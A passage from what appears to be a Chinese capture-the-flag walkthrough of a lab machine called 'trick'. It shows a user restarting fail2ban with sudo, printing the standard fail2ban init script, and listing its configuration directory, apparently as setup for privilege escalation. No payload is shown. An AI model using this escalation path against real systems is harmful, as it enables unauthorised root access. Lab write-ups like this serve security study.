/etc/init.d/fail2ban<br>-rwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">6712</span> <span class="hljs-title class_">Sep</span> <span class="hljs-number">23</span>  <span class="hljs-number">2018</span> /etc/init.d/fail2ban<br>michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo /etc/init.d/fail2ban restart<br>[ ok ] <span class="hljs-title class_">Restarting</span> fail2ban (via systemctl): fail2ban.service.<br>michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>

<p>26、这里先看下这个文件吧</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><code class="hljs awk">michael@trick:~$ more <span class="hljs-regexp">/etc/i</span>nit.d/fail2ban<br><span class="hljs-comment">#! /bin/sh</span><br><span class="hljs-comment">### BEGIN INIT INFO</span><br><span class="hljs-comment"># Provides:          fail2ban</span><br><span class="hljs-comment"># Required-Start:    $local_fs $remote_fs</span><br><span class="hljs-comment"># Required-Stop:     $local_fs $remote_fs</span><br><span class="hljs-comment"># Should-Start:      $time $network $syslog $named iptables firehol shorewall ipmasq arno-iptables-firewall iptables-persistent ferm ufw</span><br><span class="hljs-comment"># Should-Stop:       $network $syslog $named iptables firehol shorewall ipmasq arno-iptables-firewall iptables-persistent ferm ufw</span><br><span class="hljs-comment"># Default-Start:     2 3 4 5</span><br><span class="hljs-comment"># Default-Stop:      0 1 6</span><br><span class="hljs-comment"># Short-Description: Start/stop fail2ban</span><br><span class="hljs-comment"># Description:       Start/stop fail2ban, a daemon scanning the log files and</span><br><span class="hljs-comment">#                    banning potential attackers.</span><br><span class="hljs-comment">### END INIT INFO</span><br><br><span class="hljs-comment"># Author: Aaron Isotton &lt;aaron@isotton.com&gt;</span><br><span class="hljs-comment"># Modified: by Yaroslav Halchenko &lt;debian@onerussian.com&gt;</span><br><span class="hljs-comment">#  reindented + minor corrections + to work on sarge without modifications</span><br><span class="hljs-comment"># Modified: by Glenn Aaldering &lt;glenn@openvideo.nl&gt;</span><br><span class="hljs-comment">#  added exit codes for status command</span><br><span class="hljs-comment"># Modified: by Juan Karlo de Guzman &lt;jkarlodg@gmail.com&gt;</span><br><span class="hljs-comment">#  corrected the DAEMON&#x27;s path and the SOCKFILE</span><br><span class="hljs-comment">#  rename this file: (sudo) mv /etc/init.d/fail2ban.init /etc/init.d/fail2ban</span><br><span class="hljs-comment">#  same with the logrotate file: (sudo) mv /etc/logrotate.d/fail2ban.logrotate /etc/logrotate.d/fail2ban</span><br><span class="hljs-comment">#</span><br>PATH=<span class="hljs-regexp">/usr/</span>sbin:<span class="hljs-regexp">/usr/</span>bin:<span class="hljs-regexp">/sbin:/</span>bin:<span class="hljs-regexp">/usr/</span>local/bin<br>DESC=<span class="hljs-string">&quot;authentication failure monitor&quot;</span><br>NAME=fail2ban<br><br><span class="hljs-comment"># fail2ban-client is not a daemon itself but starts a daemon and</span><br><span class="hljs-comment"># loads its with configuration</span><br>DAEMON=<span class="hljs-regexp">/usr/</span>bin/<span class="hljs-variable">$NAME</span>-client<br>SCRIPTNAME=<span class="hljs-regexp">/etc/i</span>nit.d/<span class="hljs-variable">$NAME</span><br><br><span class="hljs-comment"># Ad-hoc way to parse out socket file name</span><br>SOCKFILE=`grep -h <span class="hljs-string">&#x27;^[^#]*socket *=&#x27;</span> <span class="hljs-regexp">/etc/</span><span class="hljs-variable">$NAME</span><span class="hljs-regexp">/$NAME.conf /</span>etc<span class="hljs-regexp">/$NAME/</span><span class="hljs-variable">$NAME</span>.local <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span>null \<br>          | tail -n <span class="hljs-number">1</span> | sed -e <span class="hljs-string">&#x27;s/.*socket *= *//g&#x27;</span> -e <span class="hljs-string">&#x27;s/ *$//g&#x27;</span>`<br>[ -z <span class="hljs-string">&quot;$SOCKFILE&quot;</span> ] &amp;&amp; SOCKFILE=<span class="hljs-string">&#x27;/var/run/fail2ban.sock&#x27;</span><br><br><span class="hljs-comment"># Exit if the package is not installed</span><br>[ -x <span class="hljs-string">&quot;$DAEMON&quot;</span> ] || <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Run as root by default.</span><br>FAIL2BAN_USER=root<br><br><span class="hljs-comment"># Read configuration variable file if it is present</span><br>[ -r <span class="hljs-regexp">/etc/</span>default<span class="hljs-regexp">/$NAME ] &amp;&amp; . /</span>etc<span class="hljs-regexp">/default/</span><span class="hljs-variable">$NAME</span><br>DAEMON_ARGS=<span class="hljs-string">&quot;$FAIL2BAN_OPTS&quot;</span><br><br><span class="hljs-comment"># Load the VERBOSE setting and other rcS variables</span><br>[ -f <span class="hljs-regexp">/etc/</span>default<span class="hljs-regexp">/rcS ] &amp;&amp; . /</span>etc<span class="hljs-regexp">/default/</span>rcS<br><br><span class="hljs-comment"># Predefine what can be missing from lsb source later on -- necessary to run</span><br><span class="hljs-comment"># on sarge. Just present it in a bit more compact way from what was shipped</span><br>log_daemon_msg () &#123;<br>        [ -z <span class="hljs-string">&quot;$1&quot;</span> ] &amp;&amp; return <span class="hljs-number">1</span><br>        echo -n <span class="hljs-string">&quot;$1:&quot;</span><br>        [ -z <span class="hljs-string">&quot;$2&quot;</span> ] || echo -n <span class="hljs-string">&quot; $2&quot;</span><br>&#125;<br><br><span class="hljs-comment"># Define LSB log_* functions.</span><br><span class="hljs-comment"># Depend on lsb-base (&gt;= 3.0-6) to ensure that this file is present.</span><br><span class="hljs-comment"># Actually has to (&gt;=2.0-7) present in sarge. log_daemon_msg is predefined</span><br><span class="hljs-comment">#  so we must be ok</span><br>. <span class="hljs-regexp">/lib/</span>lsb/init-functions<br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Shortcut function for abnormal init script interruption</span><br><span class="hljs-comment">#</span><br>report_bug()<br>&#123;<br>        echo $*<br>        echo <span class="hljs-string">&quot;Please submit a bug report to Debian BTS (reportbug fail2ban)&quot;</span><br>        <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Helper function to check if socket is present, which is often left after</span><br><span class="hljs-comment"># abnormal exit of fail2ban and needs to be removed</span><br><span class="hljs-comment">#</span><br>check_socket()<br>&#123;<br>        <span class="hljs-comment"># Return</span><br>        <span class="hljs-comment">#       0 if socket is present and readable</span><br>        <span class="hljs-comment">#       1 if socket file is not present</span><br>        <span class="hljs-comment">#       2 if socket file is present but not readable</span><br>        <span class="hljs-comment">#       3 if socket file is present but is not a socket</span><br>        [ -e <span class="hljs-string">&quot;$SOCKFILE&quot;</span> ] || return <span class="hljs-number">1</span><br>        [ -r <span class="hljs-string">&quot;$SOCKFILE&quot;</span> ] || return <span class="hljs-number">2</span><br>        [ -S <span class="hljs-string">&quot;$SOCKFILE&quot;</span> ] || return <span class="hljs-number">3</span><br>        return <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Function that starts the daemon/service</span><br><span class="hljs-comment">#</span><br>do_start()<br>&#123;<br>        <span class="hljs-comment"># Return</span><br>        <span class="hljs-comment">#       0 if daemon has been started</span><br>        <span class="hljs-comment">#       1 if daemon was already running</span><br>        <span class="hljs-comment">#       2 if daemon could not be started</span><br>        do_status &amp;&amp; return <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> [ -e <span class="hljs-string">&quot;$SOCKFILE&quot;</span> ]; then<br>                log_failure_msg <span class="hljs-string">&quot;Socket file $SOCKFILE is present&quot;</span><br>                [ <span class="hljs-string">&quot;$1&quot;</span> = <span class="hljs-string">&quot;force-start&quot;</span> ] \<br>                        &amp;&amp; log_success_msg <span class="hljs-string">&quot;Starting anyway as requested&quot;</span> \<br>                        || return <span class="hljs-number">2</span><br>                DAEMON_ARGS=<span class="hljs-string">&quot;$DAEMON_ARGS -x&quot;</span><br>        fi<br><br>        <span class="hljs-comment"># Assure that /var/run/fail2ban exists</span><br>        [ -d <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/fail2ban ] || mkdir -p /</span>var<span class="hljs-regexp">/run/</span>fail2ban<br><br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$FAIL2BAN_USER&quot;</span> != <span class="hljs-string">&quot;root&quot;</span> ]; then<br>                <span class="hljs-comment"># Make the socket directory, IP lists and fail2ban log</span><br>                <span class="hljs-comment"># files writable by fail2ban</span><br>                chown <span class="hljs-string">&quot;$FAIL2BAN_USER&quot;</span> <span class="hljs-regexp">/var/</span>run/fail2ban<br>                <span class="hljs-comment"># Create the logfile if it doesn&#x27;t exist</span><br>                touch <span class="hljs-regexp">/var/</span>log/fail2ban.log<br>                chown <span class="hljs-string">&quot;$FAIL2BAN_USER&quot;</span> <span class="hljs-regexp">/var/</span>log/fail2ban.log<br>                find <span class="hljs-regexp">/proc/</span>net/xt_recent -name <span class="hljs-string">&#x27;fail2ban-*&#x27;</span> -exec chown <span class="hljs-string">&quot;$FAIL2BAN_USER&quot;</span> &#123;&#125; \;<br>        fi<br><br>        start-stop-daemon --start --quiet --chuid <span class="hljs-string">&quot;$FAIL2BAN_USER&quot;</span> --exec <span class="hljs-variable">$DAEMON</span> -- \<br>                <span class="hljs-variable">$DAEMON_ARGS</span> start &gt; <span class="hljs-regexp">/dev/</span>null\<br>                || return <span class="hljs-number">2</span><br><br>        return <span class="hljs-number">0</span><br>&#125;<br><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Function that checks the status of fail2ban and returns</span><br><span class="hljs-comment"># corresponding code</span><br><span class="hljs-comment">#</span><br>do_status()<br>&#123;<br>        <span class="hljs-variable">$DAEMON</span> ping &gt; <span class="hljs-regexp">/dev/</span>null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>        return $?<br>&#125;<br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Function that stops the daemon/service</span><br><span class="hljs-comment">#</span><br>do_stop()<br>&#123;<br>        <span class="hljs-comment"># Return</span><br>        <span class="hljs-comment">#       0 if daemon has been stopped</span><br>        <span class="hljs-comment">#       1 if daemon was already stopped</span><br>        <span class="hljs-comment">#       2 if daemon could not be stopped</span><br>        <span class="hljs-comment">#       other if a failure occurred</span><br>        <span class="hljs-variable">$DAEMON</span> status &gt; <span class="hljs-regexp">/dev/</span>null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> || return <span class="hljs-number">1</span><br>        <span class="hljs-variable">$DAEMON</span> stop &gt; <span class="hljs-regexp">/dev/</span>null || return <span class="hljs-number">2</span><br><br>        <span class="hljs-comment"># now we need actually to wait a bit since it might take time</span><br>        <span class="hljs-comment"># for server to react on client&#x27;s stop request. Especially</span><br>        <span class="hljs-comment"># important for restart command on slow boxes</span><br>        count=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> do_status &amp;&amp; [ <span class="hljs-variable">$count</span> -lt <span class="hljs-number">60</span> ]; <span class="hljs-keyword">do</span><br>                sleep <span class="hljs-number">1</span><br>                count=$((<span class="hljs-variable">$count</span>+<span class="hljs-number">1</span>))<br>        done<br>        [ <span class="hljs-variable">$count</span> -lt <span class="hljs-number">60</span> ] || return <span class="hljs-number">3</span> <span class="hljs-comment"># failed to stop</span><br><br>        return <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Function to reload configuration</span><br><span class="hljs-comment">#</span><br>do_reload() &#123;<br>        <span class="hljs-variable">$DAEMON</span> reload &gt; <span class="hljs-regexp">/dev/</span>null &amp;&amp; return <span class="hljs-number">0</span> || return <span class="hljs-number">1</span><br>        return <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-comment"># yoh:</span><br><span class="hljs-comment"># shortcut function to don&#x27;t duplicate case statements and to don&#x27;t use</span><br><span class="hljs-comment"># bashisms (arrays). Fixes #368218</span><br><span class="hljs-comment">#</span><br>log_end_msg_wrapper()<br>&#123;<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$3&quot;</span> != <span class="hljs-string">&quot;no&quot;</span> ]; then<br>                [ <span class="hljs-variable">$1</span> -lt <span class="hljs-variable">$2</span> ] &amp;&amp; value=<span class="hljs-number">0</span> || value=<span class="hljs-number">1</span><br>                log_end_msg <span class="hljs-variable">$value</span><br>        fi<br>&#125;<br><br>command=<span class="hljs-string">&quot;$1&quot;</span><br>case <span class="hljs-string">&quot;$command&quot;</span> <span class="hljs-keyword">in</span><br>        start|force-start)<br>                [ <span class="hljs-string">&quot;$VERBOSE&quot;</span> != no ] &amp;&amp; log_daemon_msg <span class="hljs-string">&quot;Starting $DESC&quot;</span> <span class="hljs-string">&quot;$NAME&quot;</span><br>                do_start <span class="hljs-string">&quot;$command&quot;</span><br>                log_end_msg_wrapper $? <span class="hljs-number">2</span> <span class="hljs-string">&quot;$VERBOSE&quot;</span><br>                ;;<br><br>        stop)<br>                [ <span class="hljs-string">&quot;$VERBOSE&quot;</span> != no ] &amp;&amp; log_daemon_msg <span class="hljs-string">&quot;Stopping $DESC&quot;</span> <span class="hljs-string">&quot;$NAME&quot;</span><br>                do_stop<br>                log_end_msg_wrapper $? <span class="hljs-number">2</span> <span class="hljs-string">&quot;$VERBOSE&quot;</span><br>                ;;<br><br>        restart|force-reload)<br>                log_daemon_msg <span class="hljs-string">&quot;Restarting $DESC&quot;</span> <span class="hljs-string">&quot;$NAME&quot;</span><br>                do_stop<br>                case <span class="hljs-string">&quot;$?&quot;</span> <span class="hljs-keyword">in</span><br>                        <span class="hljs-number">0</span>|<span class="hljs-number">1</span>)<br>                                do_start<br>                                log_end_msg_wrapper $? <span class="hljs-number">1</span> <span class="hljs-string">&quot;always&quot;</span><br>                                ;;<br>                        *)<br>                                <span class="hljs-comment"># Failed to stop</span><br>                                log_end_msg <span class="hljs-number">1</span><br>                                ;;<br>                esac<br>                ;;<br><br>        reload|force-reload)<br>        log_daemon_msg <span class="hljs-string">&quot;Reloading $DESC&quot;</span> <span class="hljs-string">&quot;$NAME&quot;</span><br>        do_reload<br>        log_end_msg $?<br>        ;;<br><br>        status)<br>                log_daemon_msg <span class="hljs-string">&quot;Status of $DESC&quot;</span><br>                do_status<br>                case $? <span class="hljs-keyword">in</span><br>                        <span class="hljs-number">0</span>)  log_success_msg <span class="hljs-string">&quot; $NAME is running&quot;</span> ;;<br>                        <span class="hljs-number">255</span>)<br>                                check_socket<br>                                case $? <span class="hljs-keyword">in</span><br>                                        <span class="hljs-number">1</span>)  log_failure_msg <span class="hljs-string">&quot; $NAME is not running&quot;</span> &amp;&amp; <span class="hljs-keyword">exit</span> <span class="hljs-number">3</span> ;;<br>                                        <span class="hljs-number">0</span>)  log_failure_msg <span class="hljs-string">&quot; $NAME is not running but $SOCKFILE exists&quot;</span> &amp;&amp; <span class="hljs-keyword">exit</span> <span class="hljs-number">3</span> ;;<br>                                        <span class="hljs-number">2</span>)  log_failure_msg <span class="hljs-string">&quot; $SOCKFILE not readable, status of $NAME is unknown&quot;</span> &amp;&amp; <span class="hljs-keyword">exit</span> <span class="hljs-number">3</span> ;;<br>                                        <span class="hljs-number">3</span>)  log_failure_msg <span class="hljs-string">&quot; $SOCKFILE exists but not a socket, status of $NAME is unknown&quot;</span> &amp;&amp; <span class="hljs-keyword">exit</span> <span class="hljs-number">3</span> ;;<br>                                        *)  report_bug <span class="hljs-string">&quot;Unknown return code from $NAME:check_socket.&quot;</span> &amp;&amp; <span class="hljs-keyword">exit</span> <span class="hljs-number">4</span> ;;<br>                                esac<br>                                ;;<br>                        *)  report_bug <span class="hljs-string">&quot;Unknown $NAME status code&quot;</span> &amp;&amp; <span class="hljs-keyword">exit</span> <span class="hljs-number">4</span><br>                esac<br>                ;;<br>        *)<br>                echo <span class="hljs-string">&quot;Usage: $SCRIPTNAME &#123;start|force-start|stop|restart|force-reload|status&#125;&quot;</span> &gt;&amp;<span class="hljs-number">2</span><br>                <span class="hljs-keyword">exit</span> <span class="hljs-number">3</span><br>                ;;<br>esac<br><br>:<br><br><br>michael@trick:~$ ls -la /etc | grep <span class="hljs-string">&quot;fail2ban&quot;</span><br>drwxr-xr-x   <span class="hljs-number">6</span> root root    <span class="hljs-number">4096</span> Sep <span class="hljs-number">25</span> <span class="hljs-number">09</span>:<span class="hljs-number">03</span> fail2ban<br>michael@trick:~$ cd <span class="hljs-regexp">/etc/</span>fail2ban/<br>michael@trick:<span class="hljs-regexp">/etc/</span>fail2ban$ <br></code></pre></td></tr></table></figure>

<p>27、继续分析下版本及其他信息</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span 